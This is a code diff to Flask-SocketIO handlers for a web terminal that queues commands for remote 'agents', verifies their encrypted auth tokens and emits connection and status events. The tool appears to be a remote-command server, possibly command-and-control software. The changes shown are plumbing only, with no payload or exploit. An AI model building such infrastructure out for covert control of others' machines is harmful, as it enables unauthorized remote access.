@@ -74,17 +74,19 @@ def init_socket_handlers(socketio):
                 task_id = c.lastrowid
                 conn.close()
                 
-                emit('output', {
+                emit('terminal_output', {
                     'agent_id': agent_id,
                     'command': command,
                     'output': f"Command queued (Task ID: {task_id})",
-                    'task_id': task_id
+                    'task_id': task_id,
+                    'current_dir': current_dir
                 }, room=f"terminal_{agent_id}", namespace='/terminal')
                 
             except Exception as e:
-                emit('output', {
+                emit('terminal_output', {
                     'agent_id': agent_id,
-                    'error': f"Command submission failed: {str(e)}"
+                    'error': f"Command submission failed: {str(e)}",
+                    'current_dir': current_dir
                 }, room=f"terminal_{agent_id}", namespace='/terminal')
 
     @socketio.on('ws_control', namespace='/terminal')
@@ -140,6 +142,8 @@ def init_socket_handlers(socketio):
             # Verify agent authentication
             decrypted = SecureComms.decrypt(data['auth_token'])
             if decrypted.get('agent_id') != data['agent_id']:
+                if current_app.config.get('DEBUG'):
+                    print(f"[!] Invalid auth token from {data['agent_id']}")
                 return False
             
             join_room(f"agent_{data['agent_id']}", namespace='/terminal')
@@ -152,12 +156,37 @@ def init_socket_handlers(socketio):
             conn.commit()
             conn.close()
             
+            if current_app.config.get('DEBUG'):
+                print(f"[+] Agent {data['agent_id']} connected via WebSocket")
+            
+            # Notify terminal interface
             emit('agent_connected', {
                 'status': 'success',
                 'agent_id': data['agent_id']
             }, room=f"agent_{data['agent_id']}", namespace='/terminal')
+            
+            emit('status', {
+                'status': 'connected',
+                'agent_id': data['agent_id']
+            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
+            
+            emit('ws_status', {
+                'agent_id': data['agent_id'],
+                'action': 'start',
+                'status': 'success',
+                'message': 'WebSocket connection established'
+            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
+            
             return True
-        except:
+        except Exception as e:
+            if current_app.config.get('DEBUG'):
+                print(f"[!] Agent connection error: {str(e)}")
+            emit('ws_status', {
+                'agent_id': data['agent_id'],
+                'action': 'start',
+                'status': 'error',
+                'message': str(e)
+            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
             return False
 
     @socketio.on('disconnect', namespace='/terminal')
@@ -172,3 +201,15 @@ def init_socket_handlers(socketio):
                 c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
                 conn.commit()
                 conn.close()
+                
+                emit('status', {
+                    'status': 'disconnected',
+                    'agent_id': agent_id
+                }, room=f"terminal_{agent_id}", namespace='/terminal')
+                
+                emit('ws_status', {
+                    'agent_id': agent_id,
+                    'action': 'stop',
+                    'status': 'success',
+                    'message': 'WebSocket disconnected'
+                }, room=f"terminal_{agent_id}", namespace='/terminal')
